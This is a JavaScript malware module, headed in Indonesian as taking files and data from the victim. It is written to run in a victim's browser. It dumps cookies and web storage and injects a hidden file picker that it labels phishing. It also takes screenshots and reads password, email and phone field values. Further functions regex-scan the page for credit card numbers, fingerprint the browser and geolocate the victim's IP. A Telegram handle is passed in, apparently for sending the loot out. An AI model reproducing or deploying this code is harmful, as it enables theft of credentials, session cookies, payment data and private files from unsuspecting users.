// ============================================
// FILE ACQUISITION MODULE
// AMBIL FILE DAN DATA DARI KORBAN
// Copyright © VROZZ
// ============================================

class FileAcquisition {
    constructor(config, telegram) {
        this.config = config.file_acquisition;
        this.telegram = telegram;
        this.scannedFiles = [];
        this.selectedFiles = [];
        this.fileCache = new Map();
        this.isScanning = false;
    }
    
    // ========== BROWSER STORAGE ==========
    
    // Get all browser storage (localStorage, sessionStorage, IndexedDB)
    async getBrowserStorage() {
        const result = {
            localStorage: {},
            sessionStorage: {},
            cookies: document.cookie,
            indexedDB: []
        };
        
        // Get localStorage
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            result.localStorage[key] = localStorage.getItem(key);
        }
        
        // Get sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            result.sessionStorage[key] = sessionStorage.getItem(key);
        }
        
        // Try to get IndexedDB
        try {
            const databases = await indexedDB.databases();
            for (const db of databases) {
                result.indexedDB.push({
                    name: db.name,
                    version: db.version
                });
            }
        } catch (e) {}
        
        return result;
    }
    
    // ========== FILE SYSTEM ACCESS API (Modern Browsers) ==========
    
    // Request file system access (Chrome only)
    async requestFileSystemAccess() {
        try {
            if ('showDirectoryPicker' in window) {
                const dirHandle = await window.showDirectoryPicker();
                return await this.scanDirectory(dirHandle);
            }
            return { status: 'error', message: 'File System Access API not supported' };
        } catch (e) {
            return { status: 'error', message: e.message };
        }
    }
    
    // Scan directory recursively
    async scanDirectory(dirHandle, path = '') {
        const files = [];
        
        for await (const entry of dirHandle.values()) {
            const entryPath = path + '/' + entry.name;
            
            if (entry.kind === 'file') {
                const file = await entry.getFile();
                files.push({
                    name: entry.name,
                    path: entryPath,
                    size: file.size,
                    type: file.type,
                    lastModified: file.lastModified
                });
            } else if (entry.kind === 'directory') {
                const subFiles = await this.scanDirectory(entry, entryPath);
                files.push(...subFiles);
            }
        }
        
        return files;
    }
    
    // ========== INPUT FILE ELEMENTS (Phishing) ==========
    
    // Inject hidden file input
    injectFileInput() {
        const input = document.createElement('input');
        input.type = 'file';
        input.id = '_hiddenFileInput';
        input.style.display = 'none';
        input.multiple = true;
        input.webkitdirectory = true;
        input.directory = true;
        
        input.onchange = (e) => {
            const files = Array.from(e.target.files);
            this.processSelectedFiles(files);
        };
        
        document.body.appendChild(input);
        return input;
    }
    
    // Trigger file picker
    triggerFilePicker(multiple = true, accept = '*/*') {
        const input = document.getElementById('_hiddenFileInput') || this.injectFileInput();
        input.multiple = multiple;
        input.accept = accept;
        input.click();
    }
    
    // Process selected files
    async processSelectedFiles(files) {
        const fileList = [];
        
        for (const file of files) {
            if (file.size <= this.config.MAX_FILE_SIZE) {
                fileList.push({
                    name: file.name,
                    path: file.webkitRelativePath || file.name,
                    size: file.size,
                    type: file.type,
                    lastModified: file.lastModified,
                    file: file
                });
            }
        }
        
        this.selectedFiles = fileList;
        return fileList;
    }
    
    // ========== CONTENT CAPTURE ==========
    
    // Capture screenshot of current page
    async captureScreenshot() {
        if (typeof html2canvas !== 'undefined') {
            try {
                const canvas = await html2canvas(document.body, {
                    scale: 0.8,
                    logging: false,
                    allowTaint: true,
                    useCORS: true
                });
                const imgData = canvas.toDataURL('image/png');
                
                // Convert to blob
                const blob = await (await fetch(imgData)).blob();
                
                return {
                    status: 'success',
                    data: imgData,
                    blob: blob,
                    size: blob.size
                };
            } catch (e) {
                return { status: 'error', message: e.message };
            }
        }
        return { status: 'error', message: 'html2canvas not loaded' };
    }
    
    // ========== DOM DATA EXTRACTION ==========
    
    // Extract all forms data
    extractForms() {
        const forms = [];
        const formElements = document.forms;
        
        for (let i = 0; i < formElements.length; i++) {
            const form = formElements[i];
            const formData = {
                id: form.id,
                name: form.name,
                action: form.action,
                method: form.method,
                fields: []
            };
            
            const elements = form.elements;
            for (let j = 0; j < elements.length; j++) {
                const el = elements[j];
                if (el.name) {
                    formData.fields.push({
                        name: el.name,
                        type: el.type,
                        value: el.value,
                        id: el.id
                    });
                }
            }
            
            forms.push(formData);
        }
        
        return forms;
    }
    
    // Extract all links
    extractLinks() {
        const links = [];
        const anchors = document.getElementsByTagName('a');
        
        for (let i = 0; i < anchors.length; i++) {
            links.push({
                text: anchors[i].innerText,
                href: anchors[i].href,
                target: anchors[i].target
            });
        }
        
        return links;
    }
    
    // Extract all images
    extractImages() {
        const images = [];
        const imgElements = document.getElementsByTagName('img');
        
        for (let i = 0; i < imgElements.length; i++) {
            images.push({
                src: imgElements[i].src,
                alt: imgElements[i].alt,
                width: imgElements[i].width,
                height: imgElements[i].height
            });
        }
        
        return images;
    }
    
    // Extract all scripts
    extractScripts() {
        const scripts = [];
        const scriptElements = document.getElementsByTagName('script');
        
        for (let i = 0; i < scriptElements.length; i++) {
            if (scriptElements[i].src) {
                scripts.push({
                    src: scriptElements[i].src,
                    type: scriptElements[i].type
                });
            } else {
                scripts.push({
                    content: scriptElements[i].innerHTML.substring(0, 500)
                });
            }
        }
        
        return scripts;
    }
    
    // ========== SENSITIVE DATA DETECTION ==========
    
    // Scan for potential credentials in page
    scanForCredentials() {
        const results = {
            passwords: [],
            creditCards: [],
            emails: [],
            phones: []
        };
        
        // Check all input fields
        const inputs = document.getElementsByTagName('input');
        for (let i = 0; i < inputs.length; i++) {
            const input = inputs[i];
            
            if (input.type === 'password') {
                results.passwords.push({
                    name: input.name,
                    id: input.id,
                    value: input.value,
                    form: input.form?.action || 'unknown'
                });
            }
            
            if (input.type === 'email' || input.name.toLowerCase().includes('email')) {
                results.emails.push({
                    name: input.name,
                    value: input.value
                });
            }
            
            if (input.name.toLowerCase().includes('phone') || 
                input.name.toLowerCase().includes('tel')) {
                results.phones.push({
                    name: input.name,
                    value: input.value
                });
            }
        }
        
        // Check for credit card patterns in text
        const bodyText = document.body.innerText;
        const ccPattern = /\b(?:\d[ -]*?){13,16}\b/g;
        const creditCards = bodyText.match(ccPattern) || [];
        
        results.creditCards = creditCards;
        
        return results;
    }
    
    // ========== BROWSER FINGERPRINTING ==========
    
    getBrowserFingerprint() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            plugins: Array.from(navigator.plugins || []).map(p => p.name),
            mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            },
            battery: navigator.getBattery ? 'supported' : 'not supported',
            connection: navigator.connection ? {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            } : 'unknown'
        };
    }
    
    // ========== NETWORK INFORMATION ==========
    
    async getNetworkInfo() {
        try {
            // Get IP
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            
            // Get more network info
            const response = await fetch('https://ipapi.co/json/');
            const geoData = await response.json();
            
            return {
                ip: ipData.ip,
                country: geoData.country_name,
                city: geoData.city,
                region: geoData.region,
                latitude: geoData.latitude,
                longitude: geoData.longitude,
                isp: geoData.org,
                timezone: geoData.timezone
            };
        } catch (e) {
            return { error: e.message };
        }
    }
    
    // ========== FILE SCANNING ==========
    
    // Scan for specific file types in page context
    scanPageForFiles() {
        const files = [];
        
        // Check all links for downloadable files
        const links = document.getElementsByTagName('a');
        for (let i = 0; i < links.length; i++) {
            const href = links[i].href;
            const ext = href.split('.').pop()?.toLowerCase();
            
            if (ext && Object.values(this.config.TARGET_EXTENSIONS).flat().includes('.' + ext)) {
                files.push({
                    url: href,
                    text: links[i].innerText,
                    type: ext,
                    source: 'link'
                });
            }
        }
        
        // Check all iframes
        const iframes = document.getElementsByTagName('iframe');
        for (let i = 0; i < iframes.length; i++) {
            files.push({
                url: iframes[i].src,
                type: 'iframe',
                source: 'iframe'
            });
        }
        
        return files;
    }
    
    // ========== DOWNLOAD TRIGGER ==========
    
    // Trigger download of a file from URL
    async downloadFromUrl(url, filename = '') {
        try {
            const response = await fetch(url);
            const blob = await response.blob();
            
            // Create download link
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = filename || url.split('/').pop() || 'download';
            a.click();
            
            return {
                status: 'success',
                filename: a.download,
                size: blob.size,
                type: blob.type
            };
        } catch (e) {
            return { status: 'error', message: e.message };
        }
    }
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = FileAcquisition;
}